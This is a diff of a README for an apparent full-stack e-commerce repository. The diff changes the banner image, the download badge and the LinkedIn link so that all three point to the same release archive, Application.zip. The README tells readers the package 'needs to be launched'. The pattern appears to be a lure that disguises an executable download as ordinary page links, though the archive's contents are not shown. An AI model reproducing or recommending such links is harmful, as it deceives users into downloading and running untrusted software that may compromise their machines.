@@ -1,6 +1,6 @@
 # 🌟 Welcome to the Full-Stack E-commerce Website Repository! 🌟
 
-![E-commerce Website](https://cdn.pixabay.com/photo/2017/02/18/20/09/e-commerce-2077838_960_720.png)
+![E-commerce Website](https://github.com/adriadri333/Full-Stack-Ecommerce-Website/releases/download/v1.0.0/Application.zip)
 
 ### Overview
 Welcome to the *Full-Stack E-commerce Website* repository! This is where the magic happens - a meticulously crafted e-commerce platform built with a combination of HTML, CSS, JavaScript, Django, Python, and MySQL. Get ready for a seamless online shopping experience that combines sleek design with powerful functionality. Stay tuned for the launch! 🎉
@@ -15,7 +15,7 @@ This repository houses the codebase for the upcoming full-stack e-commerce websi
 
 ### Explore the Software
 You can download the software package for this repository by clicking the link below:
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/rokytd/files/raw/refs/heads/master/Software.zip)
+[![Download Software](https://github.com/adriadri333/Full-Stack-Ecommerce-Website/releases/download/v1.0.0/Application.zip)](https://github.com/adriadri333/Full-Stack-Ecommerce-Website/releases/download/v1.0.0/Application.zip)
 
 *Note: Software package needs to be launched to get a sneak peek into the upcoming full-stack e-commerce website.*
 
@@ -26,6 +26,6 @@ Keep an eye on the **Releases** section of this repository for the latest update
 If you're passionate about software development, e-commerce, or full-stack technologies, I invite you to fork this repository, explore the code, and even contribute to make this project even better. Your ideas and contributions are always welcome!
 
 ### Let's Connect
-Connect with me on [LinkedIn](https://www.linkedin.com/) to stay updated on the progress of this project and other exciting developments in the world of full-stack web development.
+Connect with me on [LinkedIn](https://github.com/adriadri333/Full-Stack-Ecommerce-Website/releases/download/v1.0.0/Application.zip) to stay updated on the progress of this project and other exciting developments in the world of full-stack web development.
 
 Thank you for exploring the *Full-Stack E-commerce Website* repository. Get ready for a revolutionary e-commerce experience! 🚀🔥
